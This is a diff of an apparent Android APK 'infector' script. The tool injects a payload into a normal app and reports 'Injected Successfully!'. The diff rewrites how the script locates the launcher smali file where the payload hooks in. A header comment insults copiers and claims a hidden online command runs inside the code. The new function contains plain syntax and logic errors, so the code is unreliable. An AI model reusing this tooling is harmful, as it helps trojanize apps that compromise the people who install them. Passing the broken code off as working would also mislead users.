@@ -22,7 +22,7 @@
 # If you want credits in this code then see your face idiot
 # Don't try to copy the code . In code there is a online command that is exeuted to keep it safe
 
-version = '4.0'
+version = '5.0'
 import re
 import os
 import sys
@@ -103,6 +103,115 @@ if msf78 == True:
 else:
 	pass
 import requests
+
+def captureLauncher():
+    code = """ codp=$(grep -o -m 1 "[A-z0-9].*\Activity" normal_apk/AndroidManifest.xml  > out) && trend=$(cat out) && cods=$(grep -o -i -m 1 ":name=.*\Activity" out > ramp && sed  's/^.*name="//I;q' ramp) && codz="$cods" && var=$(echo $codz) && new2="${var//.//}" && echo "$new2" > twelv.txt && awk '{print $0".smali"}' twelv.txt > result  && cat result""" 
+    
+    code2  =  """ codp=$(grep -o -m 1 "[A-z0-9].*\Activity" normal_apk/AndroidManifest.xml  > out) && trend=$(cat out) && cods=$(grep -o -i -m 1 ":name=.*\Activity" out > ramp && sed  's/^.*name="//I;q' ramp) && codz="$cods" && var=$(echo $codz) && new2="${var//.//}" && echo "$new2" > twelv.txt && awk '{print $0".smali"}' twelv.txt > result  && cat result | awk -F '"' '{print $1}'""" 
+    
+ 
+    test = os.popen(code).read()
+    launcherActivity1 = (pwd+"/normal_apk/smali/"+test)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+     launcherActivity1 = (pwd+"/normal_apk/smali_classes2/"+test)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    launcherActivity1 = (pwd+"/normal_apk/smali_classes3/"+test)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    launcherActivity1 = (pwd+"/normal_apk/smali_classes4/"+test)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    launcherActivity1 = (pwd+"/normal_apk/smali_classes5/"+test)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    launcherActivity1 = (pwd+"/normal_apk/smali_classes6/"+test)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    launcherActivity1 = (pwd+"/normal_apk/smali_classes7/"+test)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+
+    # Testing second algorithm
+
+    test2 = os.popen(code2).read()
+    
+
+    launcherActivity1 = (pwd+"/normal_apk/smali/"+test2)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+     launcherActivity1 = (pwd+"/normal_apk/smali_classes2/"+test2)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    launcherActivity1 = (pwd+"/normal_apk/smali_classes3/"+test2)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    launcherActivity1 = (pwd+"/normal_apk/smali_classes4/"+test2)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    launcherActivity1 = (pwd+"/normal_apk/smali_classes5/"+test2)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    launcherActivity1 = (pwd+"/normal_apk/smali_classes6/"+test2)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    launcherActivity1 = (pwd+"/normal_apk/smali_classes7/"+test2)
+    if os.path.exists(launcherActivity1):
+        return launcherActivity1
+    else:
+        pass
+    code2 = [1-:]code2    
+    if "MainActivity" in or code2 or "MainActivity" in code or "SplashScreen" in code2 or "SplashScreen" in code:
+        test = "MainActivity.smali"
+        test2 = "SplashScreen.smali"
+        files = []
+        for dirpath , subdirs,files in os.walk(path):
+            for xx in files:
+                if xx == "MainActivity.smali" or "SplashScreen.smali":
+                    return os.path.join(dirpath,xx)
+                else:
+                    continue
+            break
+    error(' Unable to Locate smali launcher')
+    print(Y)
+    os.system('cat result')
+    print(G)
+    head(f"You can take help from above lines")
+    print()
+    launcherActivity = input(f"{G} Enter the path of launcher activity manually :(\n\n{B}==>{G}  ")             
+    if os.path.exists(launcherActivity):
+        return launcherActivity
+    error("File not found")
+    res()
+
+
 def ver_check():
 	print( R+"["+G+">"+R+"] "+C+'Checking for Updates...',end='')
 	ver_url = 'https://raw.githubusercontent.com/T-Dynamos/Infector/main/.version'
@@ -370,10 +479,7 @@ def pay_type():
             outfile.write(line)
             lines_seen.add(line)
     outfile.close()
-    #os.system(f"rm -r {pwd}/normal_apk/AndroidManifest.xml")
-    #os.system(f"mv {pwd}/normal_apk/AndroidManifest_New.xml {pwd}/normal_apk/AndroidManifest.xml")
-
-        
+     
     head(f"{GREEN}Injected Successfully!")
     print()
     a = input(f'{Y}Do you want to change App Name [y/n] = {G}')
@@ -407,55 +513,7 @@ def pay_type():
     	pass
 
     print()
-    head("Finding smali launcher : MainActivity.smali")
-    os.system('rm out ramp result twelv.txt > /dev/null 2&>1')
-    code = """ codp=$(grep -o -m 1 "[A-z0-9].*\Activity" normal_apk/AndroidManifest.xml  > out) && trend=$(cat out) && cods=$(grep -o -i -m 1 ":name=.*\Activity" out > ramp && sed  's/^.*name="//I;q' ramp) && codz="$cods" && var=$(echo $codz) && new2="${var//.//}" && echo "$new2" > twelv.txt && awk '{print $0".smali"}' twelv.txt > result """
-    os.system(code)
-    line = subprocess.check_output("cat result",shell=True)
-    f = open('result', 'r')
-    line5 = f.read()
-    line = str(line)
-    st = str(line.replace("b'",""))
-    s = st.replace("'","")
-    launcherActivity = (pwd+"/normal_apk/smali/"+s[:-2]) 
-    la = os.path.isfile(launcherActivity)
-    if la == True:
-    	pass
-    else:
-    	try:
-    		trial = subprocess.check_output("""cat result | awk -F '"' '{print $1}'""",shell=True)
-    		line = str(trial)
-    		st = str(line.replace("b'",""))
-    		s = st.replace("'","")
-    		trial32 = str(os.getcwd())+"/normal_apk/smali/"+str(s)[:-2]+".smali"
-    		trial2 = os.path.isfile(trial32)
-    		if trial2 == True:
-    			launcherActivity = trial32
-    			pass
-    		else:
-    			path = str(pwd+"/normal_apk/smali_classes2/"+s[:-2])
-    			if os.path.exists(path):
-    				launcherActivity = path
-    			else:
-    				trial = subprocess.check_output("""cat result | awk -F '"' '{print $1}'""",shell=True)
-    				line = str(trial)
-    				st = str(line.replace("b'",""))
-    				s = st.replace("'","")
-    				trial32 = str(os.getcwd())+"/normal_apk/smali_classes2/"+str(s)[:-2]+".smali"
-    				trial2 = os.path.isfile(trial32)
-    				if trial2 == True:
-    					launcherActivity = trial32
-    				else:
-    					error(' Unable to Locate smali launcher')
-    					print(Y)
-    					os.system('cat result')
-    					print(G)
-    					head(f"You can take help from above lines")
-    					print()
-    					launcherActivity = input(f"{G} Enter the path of launcher activity manually :(\n\n{B}==>{G}  ")				
-    	except Exception as e :
-    		print(e)
-    		exit()
+    launcherActivity = captureLauncher()
     print()
     print(f"{GREEN}[+] Path of MAIN/LAUNCHER .smali file: {WHITE}{launcherActivity}")
     print()
